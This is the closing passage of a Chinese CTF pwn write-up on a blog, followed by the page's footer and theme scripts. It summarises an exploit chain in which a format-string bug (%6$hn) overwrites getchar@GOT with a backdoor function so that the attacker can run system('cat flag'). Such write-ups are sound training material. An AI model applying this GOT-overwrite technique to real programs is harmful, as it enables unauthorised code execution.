+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">进 Good End<br>-&gt; 最后告白点触发 fmt<br>-&gt; 构造 arg6 = getchar@GOT<br>-&gt; %6$hn 把 getchar@GOT 改成 hidden_backdoor_system<br>-&gt; 程序继续跑<br>-&gt; 最后的 getchar() 实际跳进后门<br>-&gt; 发编码后的命令<br>-&gt; system(&quot;cat flag&quot;)<br></code></pre></td></tr></table></figure>
+
+<p>不得不说，inkey师傅的这道题目真的很牛逼，Ciallo～(∠·ω&lt; )⌒★</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>0psu3线下赛-ciallo_wp</div>
+      <div>http://example.com/2026/04/25/0psu3线下赛-ciallo_wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 25, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/21/ccsssc2026_mail_system%E5%A4%8D%E7%8E%B0/" title="ccsssc2026_MailSystem复现">
+                        <span class="hidden-mobile">ccsssc2026_MailSystem复现</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      &copy; 2024 PJ. Powered by <a href='https://hexo.io' target='_blank'>Hexo</a> &amp; <a href='https://github.com/fluid-dev/hexo-theme-fluid' target='_blank'>Fluid</a>.
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
